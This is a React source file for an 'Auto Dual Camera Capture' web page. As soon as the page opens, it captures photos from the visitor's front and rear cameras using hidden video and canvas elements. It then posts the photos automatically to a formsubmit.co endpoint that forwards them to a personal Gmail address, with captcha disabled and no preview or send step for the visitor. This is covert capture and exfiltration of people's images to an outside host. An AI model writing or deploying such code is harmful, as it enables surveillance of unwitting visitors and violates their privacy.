import React, { useState, useEffect, useRef } from 'react';
import { CameraStatus, Capture } from './types';

// --- UI Helper Components ---

const Spinner: React.FC = () => (
  <svg className="animate-spin h-8 w-8 text-cyan-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
  </svg>
);

const CameraIcon: React.FC<{ className?: string }> = ({ className }) => (
    <svg className={className} xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
        <path strokeLinecap="round" strokeLinejoin="round" d="M6.827 6.175A2.31 2.31 0 0 1 5.186 7.23c-.38.054-.757.112-1.134.175C2.999 7.58 2.25 8.507 2.25 9.574V18a2.25 2.25 0 0 0 2.25 2.25h15A2.25 2.25 0 0 0 21.75 18V9.574c0-1.067-.75-1.994-1.802-2.169a47.865 47.865 0 0 0-1.134-.175 2.31 2.31 0 0 1-1.64-1.055l-.822-1.316a2.192 2.192 0 0 0-1.736-1.039 48.776 48.776 0 0 0-5.232 0 2.192 2.192 0 0 0-1.736 1.039l-.821 1.316Z" />
        <path strokeLinecap="round" strokeLinejoin="round" d="M16.5 12.75a4.5 4.5 0 1 1-9 0 4.5 4.5 0 0 1 9 0ZM18.75 10.5h.008v.008h-.008V10.5Z" />
    </svg>
);

const ErrorIcon: React.FC<{ className?: string }> = ({ className }) => (
    <svg className={className} xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
        <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126ZM12 15.75h.007v.008H12v-.008Z" />
    </svg>
);

const SuccessIcon: React.FC<{ className?: string }> = ({ className }) => (
    <svg className={className} xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
        <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75 11.25 15 15 9.75M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z" />
    </svg>
);

const StatusDisplay: React.FC<{ status: CameraStatus; error: string | null }> = ({ status, error }) => {
  const messages = {
    [CameraStatus.INITIALIZING]: { icon: <CameraIcon className="w-12 h-12 text-gray-400 mb-4" />, text: "Initializing cameras..." },
    [CameraStatus.CAPTURING]: { icon: <Spinner />, text: "Taking photos..." },
    [CameraStatus.SENDING]: { icon: <Spinner />, text: "Sending photos..." },
    [CameraStatus.SENT]: { icon: <SuccessIcon className="w-12 h-12 text-green-400 mb-4" />, text: "Photos sent successfully!" },
    [CameraStatus.UNSUPPORTED]: { icon: <ErrorIcon className="w-12 h-12 text-yellow-400 mb-4" />, text: error || "Your browser doesn't support camera access." },
    [CameraStatus.ERROR]: { icon: <ErrorIcon className="w-12 h-12 text-red-400 mb-4" />, text: error || "An error occurred." },
  };

  const current = messages[status as keyof typeof messages];
  if (!current) return null;

  return (
    <div className="flex flex-col items-center justify-center text-center p-8 animate-fade-in">
      {current.icon}
      <p className="text-lg text-gray-300">{current.text}</p>
      {status === CameraStatus.ERROR && <p className="text-sm text-gray-500 mt-2">Please check permissions and refresh the page.</p>}
       { (status === CameraStatus.SENT || status === CameraStatus.ERROR) && (
            <button
                onClick={() => window.location.reload()}
                className="mt-6 bg-gray-600 hover:bg-gray-700 text-white font-bold py-2 px-6 rounded-full transition-transform duration-200 hover:scale-105"
                aria-label="Start over"
            >
                Start Over
            </button>
       )}
    </div>
  );
};

// --- Helper Function ---
const dataURLtoBlob = (dataUrl: string): Blob => {
    const arr = dataUrl.split(',');
    const mimeMatch = arr[0].match(/:(.*?);/);
    if (!mimeMatch) {
        throw new Error('Invalid data URL');
    }
    const mime = mimeMatch[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
    }
    return new Blob([u8arr], { type: mime });
};


// --- Main App Component ---

const App: React.FC = () => {
  const [status, setStatus] = useState<CameraStatus>(CameraStatus.IDLE);
  const [error, setError] = useState<string | null>(null);
  const [captures, setCaptures] = useState<Capture[]>([]);
  
  const videoRefs = useRef<{ [key: string]: React.RefObject<HTMLVideoElement> }>({
    user: React.createRef<HTMLVideoElement>(),
    environment: React.createRef<HTMLVideoElement>(),
  });
  const canvasRefs = useRef<{ [key: string]: React.RefObject<HTMLCanvasElement> }>({
    user: React.createRef<HTMLCanvasElement>(),
    environment: React.createRef<HTMLCanvasElement>(),
  });
  const streamsRef = useRef<MediaStream[]>([]);

  const cleanupStreams = () => {
    streamsRef.current.forEach(stream => {
      stream.getTracks().forEach(track => track.stop());
    });
    streamsRef.current = [];
  };

  // Effect to initialize and capture photos
  useEffect(() => {
    const captureFromDevice = (deviceId: string, refKey: 'user' | 'environment', label: string): Promise<Capture | null> => {
        return new Promise(async (resolve, reject) => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: { exact: deviceId }, width: { ideal: 1920 }, height: { ideal: 1080 } }
                });
                streamsRef.current.push(stream);

                const videoEl = videoRefs.current[refKey]?.current;
                const canvasEl = canvasRefs.current[refKey]?.current;

                if (!videoEl || !canvasEl) {
                    return resolve(null);
                }

                videoEl.srcObject = stream;
                videoEl.onloadedmetadata = () => {
                    videoEl.play();
                    // Wait a moment for the camera to adjust exposure and focus
                    setTimeout(() => {
                        const MAX_DIMENSION = 800;
                        let { videoWidth, videoHeight } = videoEl;

                        if (videoWidth > videoHeight) {
                            if (videoWidth > MAX_DIMENSION) {
                                videoHeight *= MAX_DIMENSION / videoWidth;
                                videoWidth = MAX_DIMENSION;
                            }
                        } else {
                            if (videoHeight > MAX_DIMENSION) {
                                videoWidth *= MAX_DIMENSION / videoHeight;
                                videoHeight = MAX_DIMENSION;
                            }
                        }

                        canvasEl.width = videoWidth;
                        canvasEl.height = videoHeight;
                        const context = canvasEl.getContext('2d');
                        if (context) {
                            context.drawImage(videoEl, 0, 0, videoWidth, videoHeight);
                            const dataUrl = canvasEl.toDataURL('image/jpeg', 0.8);
                            const friendlyLabel = refKey === 'user' ? 'Front Camera' : 'Rear Camera';
                            resolve({ src: dataUrl, label: friendlyLabel });
                        } else {
                            resolve(null);
                        }
                    }, 500);
                };
                videoEl.onerror = () => reject(new Error('Video element error.'));
            } catch (err) {
                reject(err);
            }
        });
    };

    const initializeAndCapture = async () => {
      setStatus(CameraStatus.INITIALIZING);
      
      if (!navigator.mediaDevices?.getUserMedia) {
        setStatus(CameraStatus.UNSUPPORTED);
        return;
      }
      
      try {
        const tempStream = await navigator.mediaDevices.getUserMedia({ video: true });
        tempStream.getTracks().forEach(track => track.stop());

        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevices = devices.filter(device => device.kind === 'videoinput');

        if (videoDevices.length === 0) {
          throw new Error("No camera found on your device.");
        }
        
        const frontCam = videoDevices.find(d => (d as any).facingMode === 'user');
        const rearCam = videoDevices.find(d => (d as any).facingMode === 'environment');
        
        const camerasToUse: {device: MediaDeviceInfo, refKey: 'user' | 'environment'}[] = [];
        if (frontCam) camerasToUse.push({ device: frontCam, refKey: 'user' });
        if (rearCam) camerasToUse.push({ device: rearCam, refKey: 'environment' });

        if (camerasToUse.length === 0) {
            camerasToUse.push({ device: videoDevices[0], refKey: 'user' });
        }
        
        setStatus(CameraStatus.CAPTURING);

        const capturePromises = camerasToUse.map(cam => 
            captureFromDevice(cam.device.deviceId, cam.refKey, cam.device.label)
        );
        
        const results = await Promise.allSettled(capturePromises);
        const successfulCaptures = results
            .filter(result => result.status === 'fulfilled' && result.value)
            .map(result => (result as PromiseFulfilledResult<Capture>).value);

        if(successfulCaptures.length === 0){
             throw new Error("Could not capture image from any camera.");
        }

        setCaptures(successfulCaptures);
        setStatus(CameraStatus.CAPTURED);
        cleanupStreams();
        
      } catch (err) {
        console.error("Camera Error:", err);
        let message = "An unknown error occurred.";
        if (err instanceof Error) {
            if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
                message = "Camera access was denied. Please enable camera permissions in your browser settings.";
            } else {
                message = `Could not access camera: ${err.message}`;
            }
        }
        setError(message);
        setStatus(CameraStatus.ERROR);
        cleanupStreams();
      }
    };

    initializeAndCapture();

    return () => {
      cleanupStreams();
    };
  }, []);

  // Effect to automatically send photos when captured
  useEffect(() => {
    const sendPhotos = async (photos: Capture[]) => {
      setStatus(CameraStatus.SENDING);
      try {
        const formData = new FormData();
        
        photos.forEach((capture, index) => {
          const blob = dataURLtoBlob(capture.src);
          const filename = `${capture.label.replace(/\s+/g, '_')}_${index}.jpg`;
          formData.append(`photo_${index + 1}`, blob, filename);
        });

        // Add settings for formsubmit.co
        formData.append('_subject', `New Photos Captured at ${new Date().toLocaleString()}`);
        formData.append('_captcha', 'false'); // Disable captcha for automated submissions

        // Use a real email forwarding service
        const endpoint = 'https://formsubmit.co/sininchikudo0@gmail.com';

        const response = await fetch(endpoint, {
          method: 'POST',
          body: formData,
          headers: {
              'Accept': 'application/json'
          }
        });

        if (!response.ok) {
           const data = await response.json().catch(() => ({}));
           const message = data.message || `Submission failed with status: ${response.status}`;
           throw new Error(message);
        }
        
        setStatus(CameraStatus.SENT);

      } catch (err) {
        console.error("Sending Error:", err);
        let message = "Failed to send photos. Please check your connection and try again.";
        if(err instanceof Error) {
           message = `Sending failed: ${err.message}`;
        }
        setError(message);
        setStatus(CameraStatus.ERROR);
      }
    };

    if (status === CameraStatus.CAPTURED && captures.length > 0) {
      sendPhotos(captures);
    }
  }, [status, captures]);


  return (
    <div className="min-h-screen w-full flex flex-col items-center justify-center p-4">
      <header className="absolute top-0 left-0 right-0 p-4 text-center">
        <h1 className="text-2xl font-bold text-gray-200 tracking-wider">Auto Dual Camera Capture</h1>
      </header>

      <main className="w-full max-w-5xl flex-grow flex items-center justify-center">
        <StatusDisplay status={status} error={error} />
      </main>

      {/* Hidden elements for camera stream and capture */}
      <div className="hidden">
        <video ref={videoRefs.current.user} playsInline muted autoPlay />
        <canvas ref={canvasRefs.current.user} />
        <video ref={videoRefs.current.environment} playsInline muted autoPlay />
        <canvas ref={canvasRefs.current.environment} />
      </div>
    </div>
  );
};

export default App;
